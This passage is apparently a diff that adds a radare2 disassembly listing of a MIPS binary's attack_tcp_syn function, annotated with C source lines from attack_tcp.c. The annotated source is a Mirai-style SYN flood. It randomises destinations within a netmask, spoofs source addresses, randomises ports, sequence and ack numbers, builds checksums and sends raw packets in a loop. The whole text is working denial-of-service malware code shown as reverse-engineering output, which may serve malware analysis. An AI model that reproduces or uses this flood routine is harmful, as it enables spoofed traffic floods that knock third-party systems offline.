+│ 0x00408afc      afc2005c       sw v0, (var_5ch)
+│ 0x00408b00      8fc2005c       lw v0, (var_5ch)                      ; attack_tcp.c:105        *((uint32_t *)opts) = 0;
+│ 0x00408b04      00000000       nop
+│ 0x00408b08      ac400000       sw zero, (v0)
+│ 0x00408b0c      8fc2005c       lw v0, (var_5ch)                      ; attack_tcp.c:106        opts += sizeof (uint32_t);
+│ 0x00408b10      00000000       nop
+│ 0x00408b14      24420004       addiu v0, v0, 4
+│ 0x00408b18      afc2005c       sw v0, (var_5ch)
+│ 0x00408b1c      8fc2005c       lw v0, (var_5ch)                      ; attack_tcp.c:109        *opts++ = 1;
+│ 0x00408b20      00000000       nop
+│ 0x00408b24      24430001       addiu v1, v0, 1
+│ 0x00408b28      afc3005c       sw v1, (var_5ch)
+│ 0x00408b2c      24030001       addiu v1, zero, 1
+│ 0x00408b30      a0430000       sb v1, (v0)
+│ 0x00408b34      8fc2005c       lw v0, (var_5ch)                      ; attack_tcp.c:112        *opts++ = PROTO_TCP_OPT_WSS;
+│ 0x00408b38      00000000       nop
+│ 0x00408b3c      24430001       addiu v1, v0, 1
+│ 0x00408b40      afc3005c       sw v1, (var_5ch)
+│ 0x00408b44      24030003       addiu v1, zero, 3
+│ 0x00408b48      a0430000       sb v1, (v0)
+│ 0x00408b4c      8fc2005c       lw v0, (var_5ch)                      ; attack_tcp.c:113        *opts++ = 3;
+│ 0x00408b50      00000000       nop
+│ 0x00408b54      24430001       addiu v1, v0, 1
+│ 0x00408b58      afc3005c       sw v1, (var_5ch)
+│ 0x00408b5c      24030003       addiu v1, zero, 3
+│ 0x00408b60      a0430000       sb v1, (v0)
+│ 0x00408b64      8fc2005c       lw v0, (var_5ch)                      ; attack_tcp.c:114        *opts++ = 6; // 2^6 = 64, window size scale = 64
+│ 0x00408b68      00000000       nop
+│ 0x00408b6c      24430001       addiu v1, v0, 1
+│ 0x00408b70      afc3005c       sw v1, (var_5ch)
+│ 0x00408b74      24030006       addiu v1, zero, 6
+│ 0x00408b78      a0430000       sb v1, (v0)
+│ 0x00408b7c      8fc20060       lw v0, (var_60h)                      ; attack_tcp.c:56    for (i = 0; i < targs_len; i++)
+│ 0x00408b80      00000000       nop
+│ 0x00408b84      24420001       addiu v0, v0, 1
+│ 0x00408b88      afc20060       sw v0, (var_60h)
+| // true: 0x00408b8c
+│ ; CODE XREF from dbg.attack_tcp_syn @ 0x40868c(x)
+│ 0x00408b8c      93c30078       lbu v1, (arg_78h)                     ; attack_tcp.c:56    for (i = 0; i < targs_len; i++) ; [0x178000:1]=0
+│                                                                      ; fp
+│ 0x00408b90      8fc20060       lw v0, (var_60h)
+│ 0x00408b94      00000000       nop
+│ 0x00408b98      0043102a       slt v0, v0, v1
+│ 0x00408b9c      1440febd       bnez v0, 0x408694
+│ 0x00408ba0      00000000       nop
+| // true: 0x00408694  false: 0x00408ba4
+│ ; CODE XREF from dbg.attack_tcp_syn @ 0x408f18(x)
+│ 0x00408ba4      afc00060       sw zero, (var_60h)                    ; attack_tcp.c:119        for (i = 0; i < targs_len; i++)
+│ 0x00408ba8      100000d5       b 0x408f00
+│ 0x00408bac      00000000       nop
+| // true: 0x00408f00
+│ ; CODE XREF from dbg.attack_tcp_syn @ 0x408f10(x)
+│ 0x00408bb0      8fc20060       lw v0, (var_60h)                      ; attack_tcp.c:121            char *pkt = pkts[i];
+│ 0x00408bb4      00000000       nop
+│ 0x00408bb8      00021080       sll v0, v0, 2
+│ 0x00408bbc      8fc30020       lw v1, (var_20h)
+│ 0x00408bc0      00000000       nop
+│ 0x00408bc4      00621021       addu v0, v1, v0
+│ 0x00408bc8      8c420000       lw v0, (v0)
+│ 0x00408bcc      00000000       nop
+│ 0x00408bd0      afc20048       sw v0, (var_48h)
+│ 0x00408bd4      8fc20048       lw v0, (var_48h)                      ; attack_tcp.c:122            struct iphdr *iph = (struct iphdr *)pkt;
+│ 0x00408bd8      00000000       nop
+│ 0x00408bdc      afc2004c       sw v0, (var_4ch)
+│ 0x00408be0      8fc2004c       lw v0, (var_4ch)                      ; attack_tcp.c:123            struct tcphdr *tcph = (struct tcphdr *)(iph + 1);
+│ 0x00408be4      00000000       nop
+│ 0x00408be8      24420014       addiu v0, v0, 0x14
+│ 0x00408bec      afc20050       sw v0, (var_50h)
+│ 0x00408bf0      8fc20060       lw v0, (var_60h)                      ; attack_tcp.c:126            if (targs[i].netmask < 32)
+│ 0x00408bf4      00000000       nop
+│ 0x00408bf8      00401825       move v1, v0
+│ 0x00408bfc      00601025       move v0, v1
+│ 0x00408c00      00021040       sll v0, v0, 1
+│ 0x00408c04      00431021       addu v0, v0, v1
+│ 0x00408c08      000210c0       sll v0, v0, 3
+│ 0x00408c0c      00401825       move v1, v0
+│ 0x00408c10      8fc2007c       lw v0, (arg_7ch)
+│ 0x00408c14      00000000       nop
+│ 0x00408c18      00431021       addu v0, v0, v1
+│ 0x00408c1c      90420014       lbu v0, 0x14(v0)
+│ 0x00408c20      00000000       nop
+│ 0x00408c24      2c420020       sltiu v0, v0, 0x20
+│ 0x00408c28      1040002b       beqz v0, 0x408cd8
+│ 0x00408c2c      00000000       nop
+| // true: 0x00408cd8  false: 0x00408c30
+│ 0x00408c30      8fc20060       lw v0, (var_60h)                      ; attack_tcp.c:127                iph->daddr = htonl(ntohl(targs[i].addr) + (((uint32_t)rand_next()) >> targs[i].netmask));
+│ 0x00408c34      00000000       nop
+│ 0x00408c38      00401825       move v1, v0
+│ 0x00408c3c      00601025       move v0, v1
+│ 0x00408c40      00021040       sll v0, v0, 1
+│ 0x00408c44      00431021       addu v0, v0, v1
+│ 0x00408c48      000210c0       sll v0, v0, 3
+│ 0x00408c4c      00401825       move v1, v0
+│ 0x00408c50      8fc2007c       lw v0, (arg_7ch)
+│ 0x00408c54      00000000       nop
+│ 0x00408c58      00431021       addu v0, v0, v1
+│ 0x00408c5c      8c420010       lw v0, 0x10(v0)
+│ 0x00408c60      00000000       nop
+│ 0x00408c64      00402025       move a0, v0
+│ 0x00408c68      0c1088a2       jal sym..pic.ntohl
+│ 0x00408c6c      00000000       nop
+│ 0x00408c70      00408025       move s0, v0
+│ 0x00408c74      0c103d49       jal dbg.rand_next
+│ 0x00408c78      00000000       nop
+│ 0x00408c7c      00401825       move v1, v0
+│ 0x00408c80      8fc20060       lw v0, (var_60h)
+│ 0x00408c84      00000000       nop
+│ 0x00408c88      00402025       move a0, v0
+│ 0x00408c8c      00801025       move v0, a0
+│ 0x00408c90      00021040       sll v0, v0, 1
+│ 0x00408c94      00441021       addu v0, v0, a0
+│ 0x00408c98      000210c0       sll v0, v0, 3
+│ 0x00408c9c      00402025       move a0, v0
+│ 0x00408ca0      8fc2007c       lw v0, (arg_7ch)
+│ 0x00408ca4      00000000       nop
+│ 0x00408ca8      00441021       addu v0, v0, a0
+│ 0x00408cac      90420014       lbu v0, 0x14(v0)
+│ 0x00408cb0      00000000       nop
+│ 0x00408cb4      00431006       srlv v0, v1, v0
+│ 0x00408cb8      02021021       addu v0, s0, v0
+│ 0x00408cbc      00402025       move a0, v0
+│ 0x00408cc0      0c1088a2       jal sym..pic.ntohl
+│ 0x00408cc4      00000000       nop
+│ 0x00408cc8      00401825       move v1, v0
+│ 0x00408ccc      8fc2004c       lw v0, (var_4ch)
+│ 0x00408cd0      00000000       nop
+│ 0x00408cd4      ac430010       sw v1, 0x10(v0)
+| // true: 0x00408cd8
+│ ; CODE XREF from dbg.attack_tcp_syn @ 0x408c28(x)
+│ 0x00408cd8      8fc30040       lw v1, (var_40h)                      ; attack_tcp.c:129            if (source_ip == 0xffffffff)
+│ 0x00408cdc      2402ffff       addiu v0, zero, -1
+│ 0x00408ce0      14620007       bne v1, v0, 0x408d00
+│ 0x00408ce4      00000000       nop
+| // true: 0x00408d00  false: 0x00408ce8
+│ 0x00408ce8      0c103d49       jal dbg.rand_next                     ; attack_tcp.c:130                iph->saddr = rand_next();
+│ 0x00408cec      00000000       nop
+│ 0x00408cf0      00401825       move v1, v0
+│ 0x00408cf4      8fc2004c       lw v0, (var_4ch)
+│ 0x00408cf8      00000000       nop
+│ 0x00408cfc      ac43000c       sw v1, 0xc(v0)
+| // true: 0x00408d00
+│ ; CODE XREF from dbg.attack_tcp_syn @ 0x408ce0(x)
+│ 0x00408d00      97c30026       lhu v1, (arg_26h)                     ; attack_tcp.c:131            if (ip_ident == 0xffff)
+│ 0x00408d04      3402ffff       ori v0, zero, 0xffff
+│ 0x00408d08      14620007       bne v1, v0, 0x408d28
+│ 0x00408d0c      00000000       nop
+| // true: 0x00408d28  false: 0x00408d10
+│ 0x00408d10      0c103d49       jal dbg.rand_next                     ; attack_tcp.c:132                iph->id = rand_next() & 0xffff;
+│ 0x00408d14      00000000       nop
+│ 0x00408d18      3043ffff       andi v1, v0, 0xffff
+│ 0x00408d1c      8fc2004c       lw v0, (var_4ch)
+│ 0x00408d20      00000000       nop
+│ 0x00408d24      a4430004       sh v1, 4(v0)
+| // true: 0x00408d28
+│ ; CODE XREF from dbg.attack_tcp_syn @ 0x408d08(x)
+│ 0x00408d28      97c3002a       lhu v1, (arg_2ah)                     ; attack_tcp.c:133            if (sport == 0xffff)
+│ 0x00408d2c      3402ffff       ori v0, zero, 0xffff
+│ 0x00408d30      14620007       bne v1, v0, 0x408d50
+│ 0x00408d34      00000000       nop
+| // true: 0x00408d50  false: 0x00408d38
+│ 0x00408d38      0c103d49       jal dbg.rand_next                     ; attack_tcp.c:134                tcph->source = rand_next() & 0xffff;
+│ 0x00408d3c      00000000       nop
+│ 0x00408d40      3043ffff       andi v1, v0, 0xffff
+│ 0x00408d44      8fc20050       lw v0, (var_50h)
+│ 0x00408d48      00000000       nop
+│ 0x00408d4c      a4430000       sh v1, (v0)
+| // true: 0x00408d50
+│ ; CODE XREF from dbg.attack_tcp_syn @ 0x408d30(x)
+│ 0x00408d50      97c3002c       lhu v1, (arg_2ch)                     ; attack_tcp.c:135            if (dport == 0xffff)
+│ 0x00408d54      3402ffff       ori v0, zero, 0xffff
+│ 0x00408d58      14620007       bne v1, v0, 0x408d78
+│ 0x00408d5c      00000000       nop
+| // true: 0x00408d78  false: 0x00408d60
+│ 0x00408d60      0c103d49       jal dbg.rand_next                     ; attack_tcp.c:136                tcph->dest = rand_next() & 0xffff;
+│ 0x00408d64      00000000       nop
+│ 0x00408d68      3043ffff       andi v1, v0, 0xffff
+│ 0x00408d6c      8fc20050       lw v0, (var_50h)
+│ 0x00408d70      00000000       nop
+│ 0x00408d74      a4430002       sh v1, 2(v0)
+| // true: 0x00408d78
+│ ; CODE XREF from dbg.attack_tcp_syn @ 0x408d58(x)
+│ 0x00408d78      8fc30030       lw v1, (var_30h)                      ; attack_tcp.c:137            if (seq == 0xffff)
+│ 0x00408d7c      3402ffff       ori v0, zero, 0xffff
+│ 0x00408d80      14620007       bne v1, v0, 0x408da0
+│ 0x00408d84      00000000       nop
+| // true: 0x00408da0  false: 0x00408d88
+│ 0x00408d88      0c103d49       jal dbg.rand_next                     ; attack_tcp.c:138                tcph->seq = rand_next();
+│ 0x00408d8c      00000000       nop
+│ 0x00408d90      00401825       move v1, v0
+│ 0x00408d94      8fc20050       lw v0, (var_50h)
+│ 0x00408d98      00000000       nop
+│ 0x00408d9c      ac430004       sw v1, 4(v0)
+| // true: 0x00408da0
+│ ; CODE XREF from dbg.attack_tcp_syn @ 0x408d80(x)
+│ 0x00408da0      8fc30034       lw v1, (var_34h)                      ; attack_tcp.c:139            if (ack == 0xffff)
+│ 0x00408da4      3402ffff       ori v0, zero, 0xffff
+│ 0x00408da8      14620007       bne v1, v0, 0x408dc8
+│ 0x00408dac      00000000       nop
+| // true: 0x00408dc8  false: 0x00408db0
+│ 0x00408db0      0c103d49       jal dbg.rand_next                     ; attack_tcp.c:140                tcph->ack_seq = rand_next();
+│ 0x00408db4      00000000       nop
+│ 0x00408db8      00401825       move v1, v0
+│ 0x00408dbc      8fc20050       lw v0, (var_50h)
+│ 0x00408dc0      00000000       nop
+│ 0x00408dc4      ac430008       sw v1, 8(v0)
+| // true: 0x00408dc8
+│ ; CODE XREF from dbg.attack_tcp_syn @ 0x408da8(x)
+│ 0x00408dc8      83c20038       lb v0, (var_38h)                      ; attack_tcp.c:141            if (urg_fl)
+│ 0x00408dcc      00000000       nop
+│ 0x00408dd0      10400007       beqz v0, 0x408df0
+│ 0x00408dd4      00000000       nop
+| // true: 0x00408df0  false: 0x00408dd8
+│ 0x00408dd8      0c103d49       jal dbg.rand_next                     ; attack_tcp.c:142                tcph->urg_ptr = rand_next() & 0xffff;
+│ 0x00408ddc      00000000       nop
+│ 0x00408de0      3043ffff       andi v1, v0, 0xffff
+│ 0x00408de4      8fc20050       lw v0, (var_50h)
+│ 0x00408de8      00000000       nop
+│ 0x00408dec      a4430012       sh v1, 0x12(v0)
+| // true: 0x00408df0
+│ ; CODE XREF from dbg.attack_tcp_syn @ 0x408dd0(x)
+│ 0x00408df0      8fc2004c       lw v0, (var_4ch)                      ; attack_tcp.c:144            iph->check = 0;
+│ 0x00408df4      00000000       nop
+│ 0x00408df8      a440000a       sh zero, 0xa(v0)
+│ 0x00408dfc      24050014       addiu a1, zero, 0x14                  ; attack_tcp.c:145            iph->check = checksum_generic((uint16_t *)iph, sizeof (struct iphdr)); ; int32_t arg_ch
+│ 0x00408e00      8fc4004c       lw a0, (var_4ch)                      ; int32_t arg_8h
+│ 0x00408e04      0c1031e8       jal dbg.checksum_generic
+│ 0x00408e08      00000000       nop
+│ 0x00408e0c      00401825       move v1, v0
+│ 0x00408e10      8fc2004c       lw v0, (var_4ch)
+│ 0x00408e14      00000000       nop
+│ 0x00408e18      a443000a       sh v1, 0xa(v0)
+│ 0x00408e1c      8fc20050       lw v0, (var_50h)                      ; attack_tcp.c:147            tcph->check = 0;
+│ 0x00408e20      00000000       nop
+│ 0x00408e24      a4400010       sh zero, 0x10(v0)
+│ 0x00408e28      24040028       addiu a0, zero, 0x28                  ; attack_tcp.c:148            tcph->check = checksum_tcpudp(iph, tcph, htons(sizeof (struct tcphdr) + 20), sizeof (struct tcphdr) + 20);
+│ 0x00408e2c      0c1088aa       jal sym..pic.ntohs
+│ 0x00408e30      00000000       nop
+│ 0x00408e34      24070028       addiu a3, zero, 0x28
+│ 0x00408e38      00403025       move a2, v0                           ; int32_t arg_20h
+│ 0x00408e3c      8fc50050       lw a1, (var_50h)                      ; int32_t arg_1ch
+│ 0x00408e40      8fc4004c       lw a0, (var_4ch)                      ; int32_t arg_18h
+│ 0x00408e44      0c10321a       jal dbg.checksum_tcpudp
+│ 0x00408e48      00000000       nop
+│ 0x00408e4c      00401825       move v1, v0
+│ 0x00408e50      8fc20050       lw v0, (var_50h)
+│ 0x00408e54      00000000       nop
+│ 0x00408e58      a4430010       sh v1, 0x10(v0)
+│ 0x00408e5c      8fc20060       lw v0, (var_60h)                      ; attack_tcp.c:150            targs[i].sock_addr.sin_port = tcph->dest;
+│ 0x00408e60      00000000       nop
+│ 0x00408e64      00401825       move v1, v0
+│ 0x00408e68      00601025       move v0, v1
+│ 0x00408e6c      00021040       sll v0, v0, 1
+│ 0x00408e70      00431021       addu v0, v0, v1
+│ 0x00408e74      000210c0       sll v0, v0, 3
+│ 0x00408e78      00401825       move v1, v0
+│ 0x00408e7c      8fc2007c       lw v0, (arg_7ch)
+│ 0x00408e80      00000000       nop
+│ 0x00408e84      00431021       addu v0, v0, v1
+│ 0x00408e88      8fc30050       lw v1, (var_50h)
+│ 0x00408e8c      00000000       nop
+│ 0x00408e90      94630002       lhu v1, 2(v1)
+│ 0x00408e94      00000000       nop
+│ 0x00408e98      a4430002       sh v1, 2(v0)
+│ 0x00408e9c      8fc20060       lw v0, (var_60h)                      ; attack_tcp.c:151            sendto(fd, pkt, sizeof (struct iphdr) + sizeof (struct tcphdr) + 20, MSG_NOSIGNAL, (struct sockaddr *)&targs[i].sock_addr, sizeof (struct sockaddr_in));
+│ 0x00408ea0      00000000       nop
+│ 0x00408ea4      00401825       move v1, v0
+│ 0x00408ea8      00601025       move v0, v1
+│ 0x00408eac      00021040       sll v0, v0, 1
+│ 0x00408eb0      00431021       addu v0, v0, v1
+│ 0x00408eb4      000210c0       sll v0, v0, 3
+│ 0x00408eb8      00401825       move v1, v0
+│ 0x00408ebc      8fc2007c       lw v0, (arg_7ch)
+│ 0x00408ec0      00000000       nop
+│ 0x00408ec4      00431021       addu v0, v0, v1
+│ 0x00408ec8      00401825       move v1, v0
+│ 0x00408ecc      24020010       addiu v0, zero, 0x10
+│ 0x00408ed0      afa20014       sw v0, (var_14h)
+│ 0x00408ed4      afa30010       sw v1, (var_10h)
+│ 0x00408ed8      24074000       addiu a3, zero, 0x4000
+│ 0x00408edc      2406003c       addiu a2, zero, 0x3c
+│ 0x00408ee0      8fc50048       lw a1, (var_48h)
+│ 0x00408ee4      8fc40044       lw a0, (var_44h)
+│ 0x00408ee8      0c10880a       jal sym..pic.sendto
+│ 0x00408eec      00000000       nop
+│ 0x00408ef0      8fc20060       lw v0, (var_60h)                      ; attack_tcp.c:119        for (i = 0; i < targs_len; i++)
+│ 0x00408ef4      00000000       nop
+│ 0x00408ef8      24420001       addiu v0, v0, 1
+│ 0x00408efc      afc20060       sw v0, (var_60h)
+| // true: 0x00408f00
+│ ; CODE XREF from dbg.attack_tcp_syn @ 0x408ba8(x)
+│ 0x00408f00      93c30078       lbu v1, (arg_78h)                     ; attack_tcp.c:119        for (i = 0; i < targs_len; i++) ; [0x178000:1]=0
+│                                                                      ; fp
+│ 0x00408f04      8fc20060       lw v0, (var_60h)
+│ 0x00408f08      00000000       nop
+│ 0x00408f0c      0043102a       slt v0, v0, v1
+│ 0x00408f10      1440ff27       bnez v0, 0x408bb0
+│ 0x00408f14      00000000       nop
+| // true: 0x00408bb0  false: 0x00408f18
+│ 0x00408f18      1000ff22       b 0x408ba4                            ; attack_tcp.c:119        for (i = 0; i < targs_len; i++)
+│ 0x00408f1c      00000000       nop
+| // true: 0x00408ba4
+│ ; CODE XREF from dbg.attack_tcp_syn @ 0x408630(x)
+│ 0x00408f20      00000000       nop                                   ; attack_tcp.c:43        return;
+| // true: 0x00408f24
+│ ; CODE XREF from dbg.attack_tcp_syn @ 0x408680(x)
+│ 0x00408f24      03c0e825       move sp, fp                           ; attack_tcp.c:159}
+│ 0x00408f28      8fbf0074       lw ra, (var_74h)
+│ 0x00408f2c      8fbe0070       lw fp, (var_70h)
+│ 0x00408f30      8fb0006c       lw s0, (var_6ch)
+│ 0x00408f34      27bd0078       addiu sp, sp, 0x78
+│ 0x00408f38      03e00008       jr ra
+└ 0x00408f3c      00000000       nop
+
+
